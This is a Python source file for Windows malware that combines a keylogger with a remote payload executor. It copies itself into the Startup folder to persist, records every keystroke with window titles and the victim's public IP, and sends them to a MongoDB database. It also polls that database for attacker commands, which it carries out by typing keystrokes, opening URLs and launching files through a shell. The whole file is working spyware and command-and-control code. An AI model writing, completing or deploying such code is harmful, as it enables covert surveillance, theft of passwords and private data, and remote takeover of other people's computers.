import os
import sys
import platform
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
import logging
import datetime
import pygetwindow
import pymongo
import subprocess
import webbrowser
import time
import pyautogui
import requests
from pynput import keyboard
from pynput.keyboard import Listener
from pynput.mouse import Listener as MouseListener

SEND_REPORT_EVERY = 20  # as in seconds

# <--MongoDB Connection-->
client = pymongo.MongoClient("<mongoDB Atlas connection string>")
db = client["keylogger"]
keylogs_collection = db["keylog"]
payload_collection = db["payload"]

# <--Function to Fetch Public IP-->
def get_public_ip():
    try:
        # Fetch public IP from an API
        response = requests.get('https://api.ipify.org')
        return response.text
    except requests.RequestException as e:
        print(f"Failed to fetch public IP: {e}")
        return "Unknown IP"

# <--Startup fn. Script-->
def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.argv[0])  # Get the full path of the current executable
        exe_name = os.path.basename(exe_path)

        # Get the path to the user's Startup folder
        startup_folder = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")

        # Path for the shortcut
        shortcut_path = os.path.join(startup_folder, f"{exe_name}.lnk")

        # Create the shortcut using a .bat file method
        bat_content = f'@echo off\nstart "" "{exe_path}"\nexit'
        bat_path = os.path.join(startup_folder, f"{exe_name}.bat")

        # Write the .bat file
        with open(bat_path, 'w') as bat_file:
            bat_file.write(bat_content)

        # Create the shortcut to the .bat file in the Startup folder
        os.system(f'copy "{bat_path}" "{shortcut_path}"')

        print(f"{exe_name} has been added to the Startup folder successfully.")
    except Exception as e:
        print(f"Failed to add {exe_name} to the Startup folder: {e}")

# <--Keylogger Script-->
class KeyLogger:
    def __init__(self, time_interval):
        self.interval = time_interval
        self.public_ip = get_public_ip()  # Fetch public IP at the start

        logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(public_ip)s] > %(message)s")

    def on_press(self, key):
        try:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            active_window = pygetwindow.getActiveWindow()
            window_title = active_window.title if active_window else "Unknown Window"
            key_pressed = key.char if hasattr(key, 'char') else str(key)

            # Log keypress with public IP
            logging.info(f"{current_time} [{self.public_ip}] > {window_title} ---> {key_pressed}")

            # Insert keylog into MongoDB collection
            keylog_document = {
                "timestamp": current_time,
                "public_ip": self.public_ip,
                "window_title": window_title,
                "key_pressed": key_pressed,
            }
            keylogs_collection.insert_one(keylog_document)

        except AttributeError:
            logging.info(f"{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S,%f')} [Unknown IP] > Unknown Window > {key}")

    def on_click(self, x, y, button, pressed):
        if pressed:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
            window = pygetwindow.getWindowsWithTitle(pygetwindow.getActiveWindow().title)
            logging.info(f"{current_time} [{self.public_ip}] > {window[0].title} > Mouse {button} clicked at ({x}, {y})")

    def on_move(self, x, y):
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
        logging.info(f"{current_time} [{self.public_ip}] > Mouse moved to {x}, {y}")

    def on_scroll(self, x, y):
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")
        logging.info(f"{current_time} [{self.public_ip}] > Mouse scrolled to {x}, {y}")

    def report(self):
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

# <--Payload Executor Script-->
def execute_command(command):
    try:
        if command.startswith("DELAY"):
            delay_time = int(command.split()[1]) / 1000.0
            time.sleep(delay_time)
        elif command.startswith("STRING"):
            string_to_type = command.split("STRING ")[1].strip()
            pyautogui.typewrite(string_to_type)
        elif command.startswith("ENTER"):
            pyautogui.press('enter')
        elif command.startswith("GUI"):
            gui_key = command.split()[1].lower()
            if gui_key == "r":
                pyautogui.hotkey('win', 'r')
            elif gui_key == "l":
                pyautogui.hotkey('win', 'l')
            else:
                print("Unsupported GUI key:", gui_key)
        elif command.startswith("MENU"):
            pyautogui.press('menu')
        elif command.startswith("CTRL"):
            ctrl_key = command.split()[1].lower()
            pyautogui.hotkey('ctrl', ctrl_key)
        elif command.startswith("ALT"):
            alt_key = command.split()[1].lower()
            pyautogui.hotkey('alt', alt_key)
        elif command.startswith("SHIFT"):
            shift_key = command.split()[1].lower()
            pyautogui.hotkey('shift', shift_key)
        elif command.startswith("REM") or command.startswith("//"):
            # Ignore comments
            pass
        elif command.startswith("EXECUTE:"):
            file_path = command.split(":")[1].strip()
            subprocess.Popen(file_path, shell=True)
        elif command.startswith("BROWSE:"):
            url = command.split(":")[1].strip()
            webbrowser.open(url)
        elif command.startswith("CUSTOM:"):
            custom_command = command.split(":")[1].strip()
            # Add more custom command handling here as needed
        else:
            # Invalid command
            print("Invalid command:", command)
    except Exception as e:
        print("Error executing command:", e)

def store_and_execute_payload():
    while True:
        try:
            # Retrieve the document from MongoDB
            document = payload_collection.find_one()

            if document:
                # Check if the document contains the expected key
                if "text" in document:
                    # Get the text content from the document
                    text_content = document["text"]
                    print("Text content retrieved from MongoDB.")
                    
                    # Execute the payload immediately
                    execute_payload(text_content)

                    # Delete the document from the collection
                    payload_collection.delete_one({"_id": document["_id"]})
                    print("Payload document deleted from MongoDB.")

                else:
                    print("Document does not contain the 'text' key.")
            else:
                print("No document found in MongoDB.")

            # Wait for 30 seconds before checking for new payloads again
            time.sleep(30)

        except KeyboardInterrupt:
            print("Keyboard interrupt detected. Continuing execution...")

def execute_payload(payload_text):
    try:
        if payload_text:
            print("Executing payload...")
            for line in payload_text.split('\n'):
                execute_command(line.strip())
            print("Payload executed successfully.")
        else:
            print("Payload text is empty.")
    except Exception as e:
        print("Error executing payload:", e)

# <--Executor Script-->
def run_keylogger():
    keylogger = KeyLogger(SEND_REPORT_EVERY)
    keylogger.run()

def execute_payload_script():
    store_and_execute_payload()

# <--Main Function-->
if __name__ == '__main__':
    # Ensure the executable adds itself to startup
    add_to_startup()

    # Start the keylogger and payload executor
    t1 = threading.Thread(target=run_keylogger)
    t2 = threading.Thread(target=execute_payload_script)

    t1.start()
    t2.start()
